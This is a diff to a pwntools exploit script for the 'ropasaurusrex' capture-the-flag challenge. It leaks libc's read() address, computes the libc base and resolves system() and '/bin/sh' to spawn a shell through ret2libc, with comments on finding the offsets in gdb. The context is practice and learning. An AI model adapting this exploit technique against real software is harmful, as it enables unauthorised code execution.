@@ -8,7 +8,8 @@ if(len(sys.argv) > 1):
     if(sys.argv[1] == '--debug'):
         p = process("./ropasaurusrex")
         gdb.attach(p, """
-        b *0x0000000000400696
+            b *0x0804841d
+            b *0x0804841d
         """ )
         input("wait...")
     elif(sys.argv[1] == '--strace'):
@@ -31,16 +32,14 @@ p.send(payload)
 
 leak_read = p.recv(4)
 read_libc = u32(leak_read)
-libc_base = read_libc - 0x10a0c0 # offset check this
+libc_base = read_libc - libc.symbols["read"] # 0x10a0c0 found in gdb with "disass read" then taking the difference with the libc base address found with vmmap
 print("[!] read_libc %#x" % read_libc)
 print("[!] libc_base %#x" % libc_base)
 
 libc.address = libc_base
 
-# magic = libc_base + 0xdee03 # one_gadget, check this: we also need a rop chain to satisfy constraints....
-
-# system = libc_base + 0x0048150
-# binsh = libc_base + 0x1bd0f5
+# system = libc_base + 0x0048150 # as read above with gdb "disass system"
+# binsh = libc_base + 0x1bd0f5 # offset can be found also within gdb with "search /bin/sh"
 system = libc.symbols["system"]
 binsh = next(libc.search(b"/bin/sh\x00"))
 
